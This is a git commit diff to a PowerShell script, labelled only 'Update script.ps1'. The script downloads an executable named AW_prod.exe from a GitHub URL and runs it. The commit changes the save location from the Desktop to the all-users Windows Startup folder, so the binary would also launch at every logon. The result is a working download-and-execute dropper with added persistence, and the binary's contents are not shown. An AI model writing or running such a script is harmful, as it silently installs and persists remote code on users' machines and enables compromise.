14ba86f3f42bfda48e9549a964cdf9530ca75805
qwertyuiopindia <93660031+qwertyuiopindia@users.noreply.github.com>
2021-11-04 00:47:30 +0600

    Update script.ps1

--- script.ps1
+++ script.ps1
@@ -1,7 +1,7 @@
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 $down = New-Object System.Net.WebClient
 $url = 'https://github.com/qwertyuiopindia/test/blob/main/AW_prod.exe?raw=true'
-$file = "$($env:USERPROFILE)\Desktop\AW_prod.exe"
+$file = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\AW_prod.exe"
 $down.DownloadFile($url,$file)
 $exec = New-Object -com shell.application
 $exec.shellexecute($file)
